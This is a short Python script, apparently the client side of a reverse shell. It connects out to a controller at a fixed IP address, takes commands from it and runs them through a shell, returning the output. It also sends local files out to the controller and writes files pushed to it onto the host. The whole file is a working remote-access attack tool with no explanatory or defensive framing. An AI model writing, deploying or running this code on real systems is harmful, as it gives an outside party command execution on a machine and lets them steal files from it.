from socket import *
import subprocess
import os
import sys


port=int(sys.argv[1])

 

s=socket()
s.connect(("192.168.12.128",port))
print("[+] connecting to the server ....")
while True:
    command=s.recv(1024).decode()
    if command == "q":
        print("exiting...")
        s.close()
        break
    elif command[:2] == "cd" and len(command) > 1:
        os.chdir(command[3:].strip())
        out = "done".encode()
        s.send(out)
    elif command[:8] == "download":
        with open(command[9:].strip(),"rb") as fout:
            s.send(fout.read())
        continue
    elif command[:6] == "upload":
        with open(command[7:].strip(),"wb") as fin:
            file_data=s.recv(1024)
            fin.write(file_data)
    else:
        print("here")
        cmd=subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
        out = cmd.stdout.read() + cmd.stderr.read() 
        #print(out)
        if not out:
            out = "done".encode()
        #print(out)
        #print(type(out))
        s.send(out)

 


s.close()
